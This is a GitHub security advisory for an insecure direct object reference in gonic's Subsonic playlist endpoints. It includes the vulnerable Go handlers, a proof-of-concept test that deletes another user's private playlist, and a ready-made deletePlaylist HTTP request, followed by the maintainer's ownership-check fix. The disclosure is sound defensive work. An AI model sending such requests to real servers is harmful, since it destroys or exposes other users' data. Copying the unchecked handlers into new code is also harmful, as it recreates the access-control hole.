# [H] Subsonic API: any authenticated user can delete or read any other user's playlist (IDOR)

## Summary
Severity: High
Advisory: GHSA-hmgp-w9jm-vp95
CVE: CVE-2026-49338
CWE: CWE-285, CWE-639
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-hmgp-w9jm-vp95
Type: github-advisory

## Affected
- Go: `go.senan.xyz/gonic` — affected >=0 <0.21.0

## Details
## Summary

In gonic, the Subsonic API endpoints `/rest/deletePlaylist.view` and `/rest/getPlaylist.view` perform no per-resource authorization. Once authenticated as *any* user (admin or not), an attacker can:

1. **Delete any playlist owned by any other user** (including admin) by passing its `id`.
2. **Read the full contents** (name, comment, song list) of any other user's **private** (non-public) playlist by passing its `id`.

The Subsonic playlist `id` is `base64url("<userID>/<filename>.m3u")`. Because filenames are user-supplied or time-derived and the `userID` is a small integer, IDs are guessable and frequently exposed (e.g. a previously-public playlist that was later made private still has the same ID).

This breaks the multi-user trust boundary of gonic: a low-privileged user can wipe an administrator's curated playlists, and a user can exfiltrate any private playlist they obtain an ID for.

## Status

This was originally disclosed to the maintainer by email and has been **fixed in commit `6dd71e6a3c966867ef8c900d359a7df75789f410`** (`fix(subsonic): enforce playlist ownership on getPlaylist/deletePlaylist`, 2026-05-18). The fix has not yet been included in a tagged release; the latest tagged version `v0.20.1` is still vulnerable. Filing this advisory now that private vulnerability reporting is enabled on the repo, so the issue has a public record once the next release ships.

## Vulnerable code (pre-fix, at `v0.20.1` / commit `37090aa7`)

**Delete IDOR** — `server/ctrlsubsonic/handlers_playlist.go` lines 177-187:

```go
func (c *Controller) ServeDeletePlaylist(r *http.Request) *spec.Response {
    params := r.Context().Value(CtxParams).(params.Params)
    playlistID, err := params.GetFirstID("id", "playlistId")
    if err != nil {
        return spec.NewError(10, "please provide an `id` or `playlistId` parameter")
    }
    if err := c.playlistStore.Delete(playlistIDDecode(playlistID)); err != nil {
        return spec.NewError(0, "delete playlist: %v", err)
    }
    return spec.NewResponse()
}
```

The handler never loads the playlist to check `playlist.UserID == user.ID`. Compare to `ServeUpdatePlaylist` (same file, line 138) which *does* perform this check.

**Read IDOR** — `server/ctrlsubsonic/handlers_playlist.go` lines 51-68:

```go
func (c *Controller) ServeGetPlaylist(r *http.Request) *spec.Response {
    params := r.Context().Value(CtxParams).(params.Params)
    playlistID, err := params.GetFirstID("id", "playlistId")
    if err != nil {
        return spec.NewError(10, "please provide an `id` parameter")
    }
    playlist, err := c.playlistStore.Read(playlistIDDecode(playlistID))
    if err != nil {
        return spec.NewError(70, "playlist with id %s not found", playlistID)
    }
    // ... never checks playlist.UserID or playlist.IsPublic ...
    sub.Playlist = rendered
    return sub
}
```

The listing endpoint `ServeGetPlaylists` (line 38) correctly filters by `playlist.UserID != user.ID && !playlist.IsPublic`, but the singular `getPlaylist` did not.

## Live PoC (passing Go test)

A reproducer against the existing test fixture (`server/ctrlsubsonic`):

```go
func TestIDOR_DeleteOtherUsersPlaylist(t *testing.T) {
    f := newFixture(t)
    victimRelPath := filepath.Join("1", "victim-private.m3u")
    _ = f.contr.playlistStore.Write(victimRelPath, &playlistp.Playlist{
        UserID: f.admin.ID, Name: "victim-private", IsPublic: false,
        Items: []string{"/music/foo.flac"},
    })
    victimID := playlistIDEncode(victimRelPath).String()
    // f.alt is a non-admin, non-owner user
    body := f.query(t, f.contr.ServeDeletePlaylist, f.alt, url.Values{"id": {victimID}})
    // Subsonic returns status="ok" and the file is gone.
}
```

Test output:

```
--- PASS: TestIDOR_ReadOtherUsersPrivatePlaylist (0.07s)
--- PASS: TestIDOR_DeleteOtherUsersPlaylist (0.07s)
PASS
ok  go.senan.xyz/gonic/server/ctrlsubsonic 0.730s
```

## Equivalent HTTP request

```
GET /rest/deletePlaylist.view?u=lowpriv&p=lowpriv&v=1&c=poc&f=json&id=cGwtMS1zaGFyZWQubTN1
```

Response: `{"subsonic-response":{"status":"ok","version":"..."}}` — playlist is gone.

## Impact

- **Integrity / Availability**: low-privileged users can delete any other user's playlists, including admin's curated lists. There is no undo.
- **Confidentiality**: private playlists (including their comment fields) are readable by any authenticated user with an ID. IDs are predictable (`base64("<smallUserID>/<name>.m3u")`) and previously-public IDs persist after being marked private.
- **Trust boundary**: gonic supports multiple users (`createUser`, non-admin role). This bug collapsed the user-to-user authorization model.

## Affected versions

Latest tagged release `v0.20.1` and all prior versions back to when the playlist M3U store was introduced. Master HEAD is fixed at commit `6dd71e6a3c966867ef8c900d359a7df75789f410`.

## Suggested patch (applied by maintainer in `6dd71e6`)

Load the playlist first and enforce ownership in both handlers:

```go
// ServeGetPlaylist
if playlist.UserID != user.ID && !playlist.IsPublic {
    return spec.NewError(50, "you aren't allowed to read that user's playlist")
}

// ServeDeletePlaylist
if playlist.UserID != 0 && playlist.UserID != user.ID {
    return spec.NewError(50, "you aren't allowed to delete that user's playlist")
}
```

This mirrors the existing ownership check already present in `ServeCreateOrUpdatePlaylist` (line 84) and `ServeUpdatePlaylist` (line 138).

## Credits

Reported by Vishal Shukla ([@shukla304](https://github.com/shukla304) / [@therawdev](https://github.com/therawdev)).

## References
- https://github.com/sentriz/gonic/security/advisories/GHSA-hmgp-w9jm-vp95
- https://nvd.nist.gov/vuln/detail/CVE-2026-49338
- https://github.com/sentriz/gonic/commit/6dd71e6
- https://github.com/sentriz/gonic
